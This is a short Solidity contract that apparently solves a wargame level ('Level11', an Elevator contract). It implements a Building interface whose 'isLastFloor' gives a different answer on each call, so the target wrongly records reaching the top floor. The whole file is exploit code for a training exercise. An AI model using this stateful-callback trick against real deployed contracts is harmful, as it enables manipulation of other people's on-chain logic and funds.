// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Building, Elevator } from "./Level11.sol";

contract L11Attack is Building {
    Elevator instance;
    bool called;

    constructor(Elevator _instance) {
        instance = _instance;
    }

    function attack() external {
        instance.goTo(100);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (called) {
            return true;
        } else {
            called = true;
            return false;
        }
    }
}
